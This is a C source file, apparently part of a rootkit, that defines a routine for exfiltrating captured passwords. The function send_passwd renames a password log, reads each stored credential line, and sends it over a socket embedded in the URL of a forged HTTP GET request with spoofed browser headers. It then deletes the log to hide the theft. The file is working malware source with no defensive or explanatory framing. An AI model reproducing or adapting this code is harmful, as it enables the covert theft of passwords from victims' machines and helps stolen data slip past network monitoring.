#include <stdio.h>
#include <dirent.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include "rkcommon.h"
#include "get_ip_port.h"

int gethttphead(char *buf, char *myurl)
{
	char *tmp = buf;
	int len = 0;
	len = sprintf(tmp, "GET %s HTTP/1.1\r\n", myurl);
	tmp += len;
	len = sprintf(tmp, "Accept: text/html, application/xhtml+xml, */*\r\n");
	tmp += len;
	len = sprintf(tmp, "Referer: http://en.gpotato.eu/\r\n");
	tmp += len;
	len = sprintf(tmp, "Accept-Language: zh-CN\r\n");
	tmp += len;
	len = sprintf(tmp, "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\r\n");
	tmp += len;
	len = sprintf(tmp, "Content-Type: application/x-www-form-urlencoded\r\n");
	tmp += len;
	len = sprintf(tmp, "Connection: close\r\n");
	tmp += len;
	len = sprintf(tmp, "Cache-Control: no-cache\r\n");
	tmp += len;
	len = sprintf(tmp, "\r\n");
	tmp += len;
	return tmp - buf ;
}

int send_passwd(int sockfd)
{
	char outfile[256] = {0x0};
	snprintf(outfile, sizeof(outfile), "%s.%u", passwordlog, time(NULL));
	rename(passwordlog, outfile);

	FILE *fp = fopen(outfile, "r");
	if (fp)
	{
		char sendbuf[2048] = {0x0};
		char buf[256] = {0x0};
		int sendlen;
		while (fgets(buf, sizeof(buf), fp))
		{
			sendlen = gethttphead(sendbuf, buf);
			send(sockfd, sendbuf, sendlen, 0);
			memset(buf, 0, sizeof(buf));
			memset(sendbuf, 0, sizeof(sendbuf));
		}
		fclose(fp);
		unlink(outfile);
		return 0;
	}

	return -1;
}

